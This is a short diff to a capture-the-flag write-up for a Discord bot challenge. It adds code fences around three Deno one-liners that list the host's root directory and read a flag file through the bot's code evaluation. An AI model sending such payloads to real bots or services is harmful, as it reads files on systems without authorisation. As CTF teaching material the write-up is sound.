@@ -21,15 +21,21 @@ On discord profile for bot at TCP1Ps [Discord Server](https://discord.gg/RQ5e3EW
 
 #### First
 
+```js
 console.log([...Deno.readDirSync('/').map(file => file.name)]);
+```
 
 #### Second
 
+```js
 console.log(Deno.readTextFileSync('/flag-d53212042bb1b2dd56129c909bc93350'));
+```
 
 #### Combined
 
+```js
 console.log(Deno.readTextFileSync('/' + [...Deno.readDirSync('/').map(file => file.name)].find(name => name.startsWith('flag'))));
+```
 
 <details>
 <summary>Flag</summary>
